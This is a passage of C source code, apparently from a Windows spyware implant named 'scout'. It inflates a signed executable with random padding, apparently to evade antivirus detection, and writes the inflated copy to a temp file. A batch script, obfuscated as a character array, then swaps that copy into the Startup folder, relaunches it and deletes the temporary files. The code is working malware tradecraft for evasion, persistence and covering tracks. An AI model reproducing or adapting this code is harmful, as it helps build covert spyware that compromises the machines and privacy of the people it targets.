								CloseHandle(hScout);
									
									
#ifdef _DEBUG
								if(bFileAppended && dwFileSize == dwBytesWritten)
									OutputDebugString(L"Scout appended correctly\n");
								else
									OutputDebugString(L"Issues appending scout\n");
#endif	
							}
#ifdef _DEBUG				
							else
							{
								wchar_t buf[256];
								FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buf, 256, NULL);
								OutputDebugString(buf);
							}
#endif

							zfree(lpFatExecutableBuffer);
						}
#ifdef _DEBUG
						else
							OutputDebugString(L"No Fat Executable buffer\n");
#endif
						zfree(lpGarbagePadding);
							
						
					} else 

					/*	b]	if scout is running from startup and is not big enough (lPadding > 0)
							create an expanded kosher copy in temp and replace the one in startup 
							with a batch script
					*/
					{
						
						LPBYTE lpGarbagePadding = GetRandomData(dwPadding);
						LPBYTE lpFatExecutableBuffer = AppendDataInSignedExecutable(hScout, lpGarbagePadding, dwPadding, &dwFileSize);

						zfree(lpGarbagePadding);

						if( lpFatExecutableBuffer != NULL )
						{

							/* read only handle was needed by AppendDataInSignedExecutable */
							CloseHandle(hScout);

							LPWSTR lpTempFile = CreateTempFile();
							HANDLE hFatScout = CreateFile(lpTempFile, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

							if( hFatScout != INVALID_HANDLE_VALUE )
							{
								DWORD dwBytesWritten = 0;
								BOOL bGarbageFileWritten = WriteFile(hFatScout, lpFatExecutableBuffer, dwFileSize, &dwBytesWritten, NULL);
							
								CloseHandle(hFatScout);

#ifdef _DEBUG
								if(bGarbageFileWritten && dwBytesWritten == dwFileSize)
									OutputDebugString(L"Fat scout file written\n");
								else
									OutputDebugString(L"Issues writing fat scout file\n");
#endif

								/* Batch file increases scout size, then respawns a fat scout process */
								PWCHAR pBatchName;
								CreateFileReplacerBatch(lpTempFile, strDestPath, &pBatchName);
								StartBatch(pBatchName);
								ExitProcess(0);
							}
						} // if( lpFatExecutableBuffer != NULL )
					} // else
				} //if( dwPadding > 0 )
			}//else
		}
#ifdef _DEBUG
		else {
			OutputDebugString(L"No avg here");
		}
#endif
		
		/* free resources */
		zfree(pApplicationList);
		zfree(strDestPath);
		zfree(strSourcePath);
		zfree(strStartupPath);

}

VOID CreateFileReplacerBatch(__in PWCHAR lpGarbageFile, __in PWCHAR lpScoutStartupPath, __out PWCHAR *pBatchOutName)
{
	HANDLE hFile;
	ULONG uTick, uOut;
	PWCHAR pTempPath = GetTemp();
	PWCHAR pBatchName = (PWCHAR) malloc(32767*sizeof(WCHAR));
	
	/* 
		@echo off
		:t
		timeout 1
		for /f %%i in ('tasklist /FI "IMAGENAME eq %S"  ^| find /v /c ""' ) do set YO=%%i   # 1) current process name
		if %YO%==4 goto :t
		type "%S" > "%S"									  # 2) fat scout file , 3) scout path in startup
		start /B cmd /c "%S"								  # 4) scout path in startup
		del /F "%S"											  # 5) temp scout file 
		del /F "%S"											  # 6) batch file 
	*/
	
	CHAR pBatchFormat[] = { '@','e','c','h','o',' ','o','f','f', '\r', '\n', ':','t', '\r', '\n', 't', 'i', 'm', 'e', 'o', 'u', 't', ' ', '1', '\r', '\n', 'f', 'o', 'r', ' ', '/', 'f', ' ', '%', '%', '%', '%','i', ' ', 'i', 'n',' ','(', '\'', 't','a','s','k','l','i','s','t',' ','/','F','I',' ','"','I','M','A','G','E','N','A','M','E',' ','e','q',' ','%','S','"',' ', '^','|',' ','f','i','n','d', ' ', '/', 'v', ' ', '/', 'c', ' ', '"', '"', '\'',' ',')', ' ', 'd', 'o', ' ', 's', 'e', 't', ' ', 'Y', 'O', '=', '%', '%', '%', '%', 'i', '\r', '\n', 'i','f',' ', '%', '%', 'Y', 'O', '%', '%', '=', '=', '4', ' ','g','o','t','o',' ',':','t', '\r', '\n', 't','y','p','e',' ','"','%','S','"',' ','>', ' ','"','%','S','"', '\r', '\n', 's','t','a','r','t',' ','/','B',' ','c','m','d',' ','/','c',' ','"','%','S','"', '\r', '\n',  'd','e','l',' ','/','F',' ','"','%','S','"', '\r', '\n', 	'd','e','l',' ','/','F',' ','"','%','S','"', 0x0 };


	PCHAR pBatchBuffer = (PCHAR) malloc(strlen(pBatchFormat) + (32767 * 3));

	uTick = GetTickCount();
	do
	{
		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d.bat", pTempPath, uTick++);
		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			break;
	}
	while (1);

	WCHAR lpFullImageName[MAX_PATH*2];
	GetModuleFileName(NULL, lpFullImageName, MAX_PATH*2);
	PWCHAR lpImageName = PathFindFileName(lpFullImageName);

	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (32767 * 3), _TRUNCATE, pBatchFormat, lpImageName, lpGarbageFile, lpScoutStartupPath, lpScoutStartupPath, lpGarbageFile, pBatchName); 
	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
	CloseHandle(hFile);

#ifdef _DEBUG
	OutputDebugString(pBatchName);
	OutputDebugString(L"\n");
	OutputDebugString(lpImageName);
	OutputDebugString(L"\n");
	OutputDebugStringA(pBatchBuffer);
#endif


	*pBatchOutName = pBatchName;

	free(pBatchBuffer);
	free(pTempPath);
}